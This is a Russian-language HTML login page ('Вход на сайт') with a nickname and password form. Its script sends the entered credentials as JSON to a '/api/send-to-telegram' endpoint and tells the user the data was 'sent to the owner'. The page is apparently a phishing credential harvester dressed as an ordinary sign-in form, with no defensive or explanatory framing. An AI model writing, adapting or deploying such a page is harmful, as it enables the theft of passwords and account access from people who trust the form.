<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход на сайт</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a67d8;
        }
        #message {
            text-align: center;
            margin-top: 15px;
            color: #666;
            font-size: 14px;
        }
        .error {
            color: #e53e3e;
        }
        .success {
            color: #38a169;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Вход на сайт</h2>
        <form id="loginForm">
            <label for="username">Никнейм:</label>
            <input type="text" id="username" name="username" required placeholder="Введите ваш ник">
            
            <label for="password">Пароль:</label>
            <input type="password" id="password" name="password" required placeholder="Введите пароль">
            
            <button type="submit">Войти</button>
        </form>
        <div id="message"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                document.getElementById('message').innerHTML = '<span class="error">Заполните все поля!</span>';
                return;
            }

            document.getElementById('message').innerHTML = 'Отправка...';

            try {
                const response = await fetch('/api/send-to-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password })
                });

                const result = await response.json();

                if (result.success) {
                    document.getElementById('message').innerHTML = '<span class="success">✓ Данные отправлены владельцу!</span>';
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                } else {
                    document.getElementById('message').innerHTML = '<span class="error">✗ Ошибка отправки</span>';
                }
            } catch (error) {
                document.getElementById('message').innerHTML = '<span class="error">✗ Ошибка соединения</span>';
            }
        });
    </script>
</body>
</html>
